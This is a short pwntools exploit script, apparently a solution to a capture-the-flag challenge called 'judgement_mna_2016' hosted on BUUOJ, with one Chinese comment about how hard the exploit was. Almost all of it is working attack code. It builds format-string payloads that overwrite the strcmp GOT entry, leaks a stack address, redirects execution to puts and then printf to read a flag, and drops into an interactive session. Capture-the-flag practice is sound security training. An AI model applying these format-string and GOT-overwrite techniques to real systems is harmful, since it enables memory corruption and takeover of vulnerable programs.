from pwn import *

#这个exp写的让我觉得我是个傻逼 懂不懂复杂exp的含金量啊？

context.log_level = 'debug'

p = process('./judgement_mna_2016')
#p = remote('node4.buuoj.cn', 28751)
elf = ELF('./judgement_mna_2016')

main = elf.sym['main']
load_flag = elf.sym['load_flag']
flag = 0x0804A0A0

#gdb.attach(p, 'b *0x80487f2')

strcmp_got = elf.got['strcmp']
printf_plt = elf.plt['printf']
puts_plt = elf.plt['puts']

payload = fmtstr_payload(44, { strcmp_got : main })
payload = payload[0:0x24] + b'\0' * 0x4 + payload[0x24:0x30]
#payload = b'%8c%52$hhn%35c%53$hhn%1116c%54$hn\0\0\0' + p32(strcmp_got + 3) + p32(strcmp_got) + p32(strcmp_got + 1)
p.sendlineafter(b'flag >> ', payload)
p.sendlineafter(b'flag >> ', b'%13$p')

esp = int(p.recv(10), 16) - 0x2fd + 0x10c - 4
success('esp -> {}'.format(hex(esp)))

payload = fmtstr_payload(44, { esp : puts_plt })

payload = payload[0:0x24] + b'\0' * 4 + payload[0x24:0x30]

p.sendlineafter(b'flag >> ', payload)

payload = fmtstr_payload(44, { esp + 4 : flag })

payload = payload[0:0x24] + b'\0' * 4 + payload[0x24:0x30]

#p.sendlineafter(b'flag >> ', payload)

payload = fmtstr_payload(44, { strcmp_got : printf_plt })

payload = payload[0:0x24] + b'\0' * 4 + payload[0x24:0x30]

p.sendlineafter(b'flag >> ', payload)

p.interactive()